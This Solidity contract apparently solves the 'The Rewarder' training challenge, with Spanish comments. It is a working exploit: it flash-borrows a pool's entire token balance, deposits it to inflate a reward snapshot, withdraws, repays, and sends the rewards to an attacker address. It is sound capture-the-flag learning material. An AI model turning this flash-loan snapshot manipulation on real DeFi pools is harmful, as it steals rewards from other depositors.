// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "../5_the-rewarder/FlashLoanerPool.sol";
import "../5_the-rewarder/TheRewarderPool.sol";
import "../5_the-rewarder/RewardToken.sol";

contract TheRewarderAttacker {

  DamnValuableToken public immutable liquidityToken;

  TheRewarderPool public immutable rewarderPool;

  RewardToken public immutable rewardToken;

  FlashLoanerPool public immutable flashLoanerPool;

  constructor(address _rewarderPool, address _flashLoanerPool, address _liquidityToken, address _rewardToken) {
    rewarderPool = TheRewarderPool(_rewarderPool);
    flashLoanerPool = FlashLoanerPool(_flashLoanerPool);
    liquidityToken = DamnValuableToken(_liquidityToken);
    rewardToken = RewardToken(_rewardToken);
  }

  function attack(address attackerAddress) public {

    uint256 flashLoanerBalance = liquidityToken.balanceOf(address(flashLoanerPool));
    
    liquidityToken.approve(address(rewarderPool), flashLoanerBalance);

    flashLoanerPool.flashLoan(flashLoanerBalance);

    //Finalmente envío los rewards obtenidos al address atacante que pasé por parámetro.
    uint256 allRewards = rewardToken.balanceOf(address(this));
    rewardToken.approve(attackerAddress, allRewards);
    rewardToken.transfer(attackerAddress, allRewards);
  }

  function receiveFlashLoan(uint256 amount) external {
    //Realizamos un depósito exagerado de DVT. El contrato TheRewarderPool tomará un nuevo snapshot si es un nuevo round.
    rewarderPool.deposit(amount);

    //Una vez tomado el snapshot, retiramos el depósito por completo. Dejando el snapshot en un estado inconsistente con lo real depositado.
    rewarderPool.withdraw(amount);

    //Devuelvo por completo el préstamo solicitado a FlashLoanerPool.
    liquidityToken.transfer(address(flashLoanerPool), amount);
  }
}